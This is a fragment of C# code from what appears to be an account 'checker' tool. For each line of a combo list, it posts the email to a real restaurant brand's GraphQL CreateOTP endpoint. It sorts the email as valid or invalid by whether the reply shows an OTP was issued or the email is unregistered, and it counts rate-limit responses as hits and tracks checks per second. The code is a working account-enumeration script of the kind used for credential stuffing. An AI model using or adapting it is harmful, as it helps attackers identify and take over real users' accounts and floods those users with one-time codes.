        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    string check = req.Post("https://prod-plk.rbictg.com/graphql", new StringContent("[{\"operationName\":\"CreateOTP\",\"variables\":{\"input\":{\"email\":\"" + credentials[0] + "\",\"platform\":\"web\",\"sessionId\":\"9dc3ae19-18bc-46e5-9d6a-8c2773e46353\"}},\"query\":\"mutation CreateOTP($input: CreateOTPInput!) {\\n  createOTP(input: $input) {\\n    maxValidateAttempts\\n    ttl\\n    __typename\\n  }\\n}\\n\"}]")).ToString();
                    if (check.Contains("createOTP\":{\"maxValidateAttempts") || check.Contains("statusCode\":429"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                    ...
                    else if (check.Contains("message\":\"email not registered") || check.Contains("User does not exist")) 
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
